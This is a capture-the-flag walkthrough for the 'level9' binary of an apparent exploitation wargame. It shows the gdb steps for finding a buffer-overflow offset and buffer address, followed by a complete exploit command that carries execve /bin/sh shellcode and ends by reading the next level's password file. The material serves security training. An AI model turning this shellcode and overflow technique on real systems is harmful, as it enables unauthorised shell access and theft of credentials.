# level9 Exploit

## Steps

### 1. Disassemble the Main Function

Use `gdb` to disassemble the `main` function:
```sh
gdb level9
(gdb) disas main
```
This gives you the assembly code of the `main` function.

### 2. Convert Assembly to C++ Code

Convert the assembly code to C++ code using an online tool like [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter). The converted C++ code return the joined source.cpp. 

### 3. Generate a Pattern

Generate a unique pattern to find the offset using the [Wiremask pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/):
```sh
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
When the program crashes, use:
```sh
(gdb) info register
```
to find the value of `eip` and calculate the offset with the Wiremask offset calculator.

### 4. Determine Buffer Start Address

Set a breakpoint and run the program with a simple input:
```sh
(gdb) b *0x0804867c
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
Examine the memory to find the buffer's start address:
```sh
(gdb) x/64x $eax
```
Note the start address (e.g., `0x804a00c`).

### 5. Craft the Exploit

Create the exploit payload using the shellcode and padding:
```sh
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
```
- `"\x10\xa0\x04\x08"`: Address of the buffer plus 4 bytes (`0x804a010`).
- Shellcode: `"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"`.
- Padding: `"A" * 76`.
- `"\x0c\xa0\x04\x08"`: Start address of the buffer in little-endian (`0x804a00c`).

### 6. Run the Exploit

Run the crafted payload to execute the shellcode with the required privileges and then `cat /home/user/bonus0/.pass` to get the flag.